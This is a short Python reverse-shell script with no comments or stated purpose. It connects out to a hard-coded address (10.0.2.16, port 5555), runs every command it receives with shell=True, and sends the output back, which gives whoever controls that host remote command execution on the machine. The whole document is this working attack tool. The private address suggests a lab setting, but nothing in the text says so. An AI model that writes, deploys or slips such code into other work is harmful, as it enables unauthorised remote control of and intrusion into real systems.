import socket
import subprocess
import os

REMOTE_HOST = '10.0.2.16' 
REMOTE_PORT = 5555
client = socket.socket()
client.connect((REMOTE_HOST, REMOTE_PORT))
client.send("Connected!\n".encode())

while True:
    command = client.recv(1024).decode()
    if command == "&":
        break
    elif command.startswith("cd "):
        os.chdir(command[3:])
        client.send("Changed directory to {}\n".format(os.getcwd()).encode())
    else:
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read() + op.stderr.read()
        client.send(output)

client.close()
